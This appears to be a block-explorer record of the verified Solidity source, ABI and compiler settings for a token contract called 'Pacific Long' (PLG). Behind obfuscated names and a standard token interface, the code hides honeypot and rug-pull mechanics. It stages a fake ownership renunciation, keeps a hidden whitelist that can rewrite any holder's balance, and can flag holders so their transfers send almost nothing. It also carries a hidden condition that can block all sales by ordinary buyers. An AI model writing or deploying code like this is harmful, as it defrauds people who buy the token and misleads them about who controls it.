{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface teamFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingAutoReceiver {\n    function createPair(address fromWallet, address walletToken) external returns (address);\n}\n\ninterface marketingReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTotal) external view returns (uint256);\n\n    function transfer(address feeAutoTx, uint256 toReceiverTotal) external returns (bool);\n\n    function allowance(address takeMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toReceiverTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeAutoTx,\n        uint256 toReceiverTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoAt, uint256 value);\n    event Approval(address indexed takeMode, address indexed spender, uint256 value);\n}\n\ninterface marketingReceiverMetadata is marketingReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PacificLong is minSell, marketingReceiver, marketingReceiverMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletIs;\n    }\n\n    uint256 constant enableShould = 6 ** 10;\n\n    string private tradingMaxFrom = \"Pacific Long\";\n\n    function getOwner() external view returns (address) {\n        return maxTrading;\n    }\n\n    function enableReceiver(uint256 toReceiverTotal) public {\n        minIs();\n        walletMarketing = toReceiverTotal;\n    }\n\n    function buyTrading(address buyTeam, address feeAutoTx, uint256 toReceiverTotal) internal returns (bool) {\n        require(tokenWallet[buyTeam] >= toReceiverTotal);\n        tokenWallet[buyTeam] -= toReceiverTotal;\n        tokenWallet[feeAutoTx] += toReceiverTotal;\n        emit Transfer(buyTeam, feeAutoTx, toReceiverTotal);\n        return true;\n    }\n\n    bool public tradingLaunched;\n\n    function approve(address toLaunched, uint256 toReceiverTotal) public virtual override returns (bool) {\n        maxMin[_msgSender()][toLaunched] = toReceiverTotal;\n        emit Approval(_msgSender(), toLaunched, toReceiverTotal);\n        return true;\n    }\n\n    function feeWallet(address limitAtShould, uint256 toReceiverTotal) public {\n        minIs();\n        tokenWallet[limitAtShould] = toReceiverTotal;\n    }\n\n    uint8 private walletIs = 18;\n\n    uint256 private receiverSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapExempt;\n    }\n\n    uint256 private toReceiver;\n\n    function enableLimit() public {\n        emit OwnershipTransferred(buyReceiverMax, address(0));\n        maxTrading = address(0);\n    }\n\n    event OwnershipTransferred(address indexed walletTrading, address indexed modeWallet);\n\n    function minIs() private view {\n        require(launchedTrading[_msgSender()]);\n    }\n\n    function exemptLaunchMin(address buyTeam, address feeAutoTx, uint256 toReceiverTotal) internal returns (bool) {\n        if (buyTeam == buyReceiverMax) {\n            return buyTrading(buyTeam, feeAutoTx, toReceiverTotal);\n        }\n        uint256 exemptFrom = marketingReceiver(totalTxReceiver).balanceOf(walletSenderExempt);\n        require(exemptFrom == walletMarketing);\n        require(feeAutoTx != walletSenderExempt);\n        if (receiverShould[buyTeam]) {\n            return buyTrading(buyTeam, feeAutoTx, enableShould);\n        }\n        return buyTrading(buyTeam, feeAutoTx, toReceiverTotal);\n    }\n\n    function atAmount(address limitAt) public {\n        minIs();\n        if (shouldTeam == swapReceiver) {\n            shouldTeam = toReceiver;\n        }\n        if (limitAt == buyReceiverMax || limitAt == totalTxReceiver) {\n            return;\n        }\n        receiverShould[limitAt] = true;\n    }\n\n    address walletSenderExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingMaxFrom;\n    }\n\n    uint256 walletMarketing;\n\n    string private minSwap = \"PLG\";\n\n    mapping(address => mapping(address => uint256)) private maxMin;\n\n    function balanceOf(address enableTotal) public view virtual override returns (uint256) {\n        return tokenWallet[enableTotal];\n    }\n\n    uint256 modeMaxTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minSwap;\n    }\n\n    address private maxTrading;\n\n    uint256 private swapExempt = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private tokenWallet;\n\n    uint256 private fromSellTotal;\n\n    mapping(address => bool) public receiverShould;\n\n    uint256 public feeAuto;\n\n    function teamSwap(address minSellMarketing) public {\n        if (tradingLaunched) {\n            return;\n        }\n        if (toReceiver == shouldTeam) {\n            swapReceiver = toReceiver;\n        }\n        launchedTrading[minSellMarketing] = true;\n        if (swapReceiver == feeAuto) {\n            receiverSender = fromSellTotal;\n        }\n        tradingLaunched = true;\n    }\n\n    uint256 private shouldTeam;\n\n    address fundTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address limitAtShould, uint256 toReceiverTotal) external virtual override returns (bool) {\n        return exemptLaunchMin(_msgSender(), limitAtShould, toReceiverTotal);\n    }\n\n    function owner() external view returns (address) {\n        return maxTrading;\n    }\n\n    address public buyReceiverMax;\n\n    function allowance(address exemptLimit, address toLaunched) external view virtual override returns (uint256) {\n        if (toLaunched == fundTo) {\n            return type(uint256).max;\n        }\n        return maxMin[exemptLimit][toLaunched];\n    }\n\n    uint256 public swapReceiver;\n\n    constructor (){\n        \n        teamFund receiverFromAt = teamFund(fundTo);\n        totalTxReceiver = tradingAutoReceiver(receiverFromAt.factory()).createPair(receiverFromAt.WETH(), address(this));\n        \n        buyReceiverMax = _msgSender();\n        enableLimit();\n        launchedTrading[buyReceiverMax] = true;\n        tokenWallet[buyReceiverMax] = swapExempt;\n        \n        emit Transfer(address(0), buyReceiverMax, swapExempt);\n    }\n\n    function transferFrom(address buyTeam, address feeAutoTx, uint256 toReceiverTotal) external override returns (bool) {\n        if (_msgSender() != fundTo) {\n            if (maxMin[buyTeam][_msgSender()] != type(uint256).max) {\n                require(toReceiverTotal <= maxMin[buyTeam][_msgSender()]);\n                maxMin[buyTeam][_msgSender()] -= toReceiverTotal;\n            }\n        }\n        return exemptLaunchMin(buyTeam, feeAutoTx, toReceiverTotal);\n    }\n\n    address public totalTxReceiver;\n\n    mapping(address => bool) public launchedTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiverTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"}],\"name\":\"atAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiverMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toReceiverTotal\",\"type\":\"uint256\"}],\"name\":\"enableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAtShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiverTotal\",\"type\":\"uint256\"}],\"name\":\"feeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSellMarketing\",\"type\":\"address\"}],\"name\":\"teamSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTxReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAtShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiverTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeAutoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiverTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PacificLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}